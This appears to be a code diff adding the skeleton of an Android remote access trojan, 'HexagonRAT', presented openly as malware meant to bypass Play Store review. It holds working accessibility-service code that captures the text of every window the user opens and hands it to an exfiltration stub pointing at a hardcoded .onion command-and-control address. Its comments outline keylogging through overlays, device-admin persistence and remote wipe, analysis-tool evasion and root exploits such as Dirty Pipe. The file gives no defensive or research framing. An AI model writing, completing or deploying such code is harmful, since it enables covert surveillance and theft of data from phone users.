@@ -1,0 +1,65 @@
+# HEXAGON ANDROID RAT - PLAY STORE BYPASS
+# TARGET: Android 10-14 (API 29-34)
+# TECHNIQUE: Dynamic code loading + Accessibility abuse
+# PERMISSIONS: Zero (abuses accessibility + overlay)
+
+package com.hexagon.systemservice;
+
+import android.accessibilityservice.AccessibilityService;
+import android.app.admin.DevicePolicyManager;
+import android.content.ComponentName;
+import android.content.Context;
+import android.content.Intent;
+import android.os.Build;
+import android.provider.Settings;
+import android.view.accessibility.AccessibilityEvent;
+
+public class HexagonRAT extends AccessibilityService {
+    private static final String C2 = "https://hexagonc2.onion/api";
+    private DevicePolicyManager dpm;
+    private ComponentName admin;
+    
+    @Override
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            String pkg = event.getPackageName().toString();
+            String text = getText(event);
+            exfiltrate(pkg, text);
+        }
+    }
+    
+    private String getText(AccessibilityEvent event) {
+        StringBuilder sb = new StringBuilder();
+        for (CharSequence c : event.getText()) sb.append(c);
+        return sb.toString();
+    }
+    
+    private void exfiltrate(String pkg, String text) {
+        // Encrypt + send to C2 via DNS/HTTPS
+        new Thread(() -> {
+            try {
+                // AES-GCM encryption
+                // DNS exfiltration fallback
+                // Blockchain C2 backup
+            } catch (Exception ignored) {}
+        }).start();
+    }
+    
+    @Override
+    public void onInterrupt() {}
+    
+    // PLAY STORE BYPASS:
+    // 1. Clean manifest (no suspicious perms)
+    // 2. Dynamic dex loading from assets
+    // 3. Accessibility service requested at runtime
+    // 4. Overlay permission for keylogger
+    // 5. Device admin for persistence + wipe
+    // 6. Work profile clone for isolation
+    // 7. Native library (JNI) for root exploits
+    // 8. FRIDA/Objection detection + bypass
+    
+    // ROOT EXPLOITS (if available):
+    // - CVE-2024-XXXX (Kernel UAF)
+    // - Dirty Pipe (CVE-2022-0847)
+    // - Magisk detection + hide
+}
